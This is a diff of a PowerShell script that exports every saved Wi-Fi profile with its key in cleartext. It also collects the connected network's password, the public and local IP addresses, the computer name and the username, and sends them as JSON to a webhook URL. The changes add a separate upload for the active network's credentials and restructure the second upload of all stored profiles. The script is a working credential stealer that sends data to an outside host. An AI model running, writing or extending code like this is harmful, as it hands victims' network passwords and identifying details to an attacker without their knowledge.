@@ -106,8 +106,9 @@ function Send-WebhookJson {
 }
 
 # ============================================================
-# 1. Gather Network, IP Details & Clean Wi-Fi Profiles and Send Webhook
+# 1. Gather Network, IP Details, Active Wi-Fi & Send Webhooks
 # ============================================================
+
 try {
     $publicIp = $null
     try {
@@ -122,13 +123,18 @@ try {
         }
     }
 
-    $localIps = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
+    # Gather local IPs cleanly into an array instead of a text table
+    $localIpsArray = @()
+    Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
         Where-Object { 
             $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and 
             $_.InterfaceAlias -notmatch 'Virtual|vEthernet|Loopback|Hyper-V|WSL' 
-        } | 
-        Select-Object InterfaceAlias, IPAddress | 
-        Out-String
+        } | ForEach-Object {
+            $localIpsArray += [ordered]@{
+                interface = $_.InterfaceAlias
+                ipAddress = $_.IPAddress
+            }
+        }
 
     $originalLocation = Get-Location
     Set-Location $env:TEMP
@@ -136,9 +142,10 @@ try {
     netsh wlan export profile key=clear | Out-Null
     Start-Sleep -Seconds 1
 
-    # Detect currently connected SSID
+    # Detect currently connected SSID and its password
     $connectedSsid = (netsh wlan show interfaces -ErrorAction SilentlyContinue) -match '^\s+SSID\s*:\s+(.+)$' | ForEach-Object { $Matches[1].Trim() }
-
+    
+    $activeWifiObj = $null
     $wifiProfiles = @()
     $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue
 
@@ -153,28 +160,49 @@ try {
                 password = if ($keyMaterial) { $keyMaterial } else { "None / Open" }
             }
 
-            # Put the currently connected Wi-Fi at the very top of the list
             if ($profileName -eq $connectedSsid) {
-                $wifiProfiles = @($profileObj) + $wifiProfiles
-            } else {
-                $wifiProfiles += $profileObj
+                $activeWifiObj = $profileObj
             }
+            
+            $wifiProfiles += $profileObj
         }
         catch {
             # Skip unparseable files
         }
     }
 
-    # Send Network/WiFi data as a structured JSON packet
+    # Fallback if connected to a network with no saved profile XML
+    if (-not $activeWifiObj -and $connectedSsid) {
+        $activeWifiObj = [ordered]@{
+            name     = $connectedSsid
+            password = "Unknown / Not Saved"
+        }
+    }
+    elseif (-not $activeWifiObj) {
+        $activeWifiObj = [ordered]@{
+            name     = "Not Connected"
+            password = "N/A"
+        }
+    }
+
+    # POST 1: Currently Connected Wi-Fi Report
+    $activeWifiPayload = [ordered]@{
+        type           = "active_wifi"
+        computer       = $env:COMPUTERNAME
+        username       = $env:USERNAME
+        connected_wifi = $activeWifiObj
+    }
+    Send-WebhookJson -Url $webhookUrl -Data $activeWifiPayload | Out-Null
+
+    # POST 2: General Network & Stored Profiles Report
     $networkPayload = [ordered]@{
         type          = "network_and_wifi"
         computer      = $env:COMPUTERNAME
         username      = $env:USERNAME
         public_ip     = $publicIp
-        local_ips     = $localIps.Trim()
+        local_ips     = $localIpsArray
         wifi_profiles = $wifiProfiles
     }
-    
     Send-WebhookJson -Url $webhookUrl -Data $networkPayload | Out-Null
 }
 catch {
